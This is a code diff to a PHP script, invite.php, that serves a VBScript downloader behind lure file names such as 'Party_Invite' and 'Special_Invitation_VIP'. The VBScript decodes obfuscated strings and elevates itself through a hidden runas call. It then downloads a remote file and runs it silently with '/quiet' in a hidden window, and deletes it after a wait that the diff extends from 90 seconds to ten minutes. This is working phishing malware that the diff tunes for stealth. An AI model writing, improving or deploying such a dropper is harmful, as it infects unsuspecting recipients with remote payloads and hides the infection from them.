@@ -1,11 +1,11 @@
 <?php
-// invite.php - Improved Elevation + runas 0
+// invite.php - 10 minute wait + new elevation (runas 0)
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
 $baseNames = [
     "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
-    "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
+    "Event_Invitation", "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
     "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
     "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
 ];
@@ -61,7 +61,7 @@ Function D(s)
     D = r
 End Function
 
-' ===== IMPROVED ELEVATION (runas 0 = hidden) =====
+' ===== NEW ELEVATION METHOD (runas 0) =====
 If WScript.Arguments.Length = 0 Then
     Dim shell
     Set shell = CreateObject("Shell.Application")
@@ -88,7 +88,7 @@ Sub DownloadAndExecute()
         Set strm = CreateObject("ADODB.Stream")
         strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
         objShell.Run """" & p & """ /quiet", 0, True
-        WScript.Sleep 90000
+        WScript.Sleep 600000 ' 10 minutes
         If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
     End If
 End Sub
